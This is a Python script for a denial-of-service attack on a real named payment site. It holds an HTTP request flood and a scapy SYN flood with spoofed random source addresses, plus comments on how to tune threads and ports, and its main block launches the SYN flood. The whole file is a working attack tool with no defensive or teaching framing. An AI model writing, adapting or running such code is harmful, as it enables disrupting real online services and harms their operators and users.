import socket
import threading
from random import randint
from scapy.all import *


def find_ip(hostname: str) -> str:
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    return ip


def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip


def randomPort():
    return randint(1000, 9000)


target_ip = 'yoomoney.ru'
fake_ip = '217.107.219.57'
# port can be 443 or 80 check if the website has https
port = 443
# check before how many cores you have and use about 25% of max thread available
max_threads = 1
raw = Raw(b"X" * 1024)

# this is a counter
attack_num = 0


def standard_attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port))
        s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))

        global attack_num
        attack_num += 1
        print(attack_num)

        s.close()


def syn_attack():
    total = 0

    while True:
        # forge IP packet with target ip as the destination IP address
        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = target_ip

        # Let's forge our TCP layer:
        TCP_Packet = TCP()
        TCP_Packet.sport = randomPort()
        TCP_Packet.dport = port
        TCP_Packet.flags = "S"
        TCP_Packet.seq = randomPort()
        TCP_Packet.window = randomPort()

        send(IP_Packet / TCP_Packet / raw, verbose=0)
        total += 1
        print(f"{total} bayraktar")

def initiate(attack_type):
    for i in range(max_threads):
        thread = threading.Thread(target=attack_type)
        thread.start()


if __name__ == "__main__":
    syn_attack()
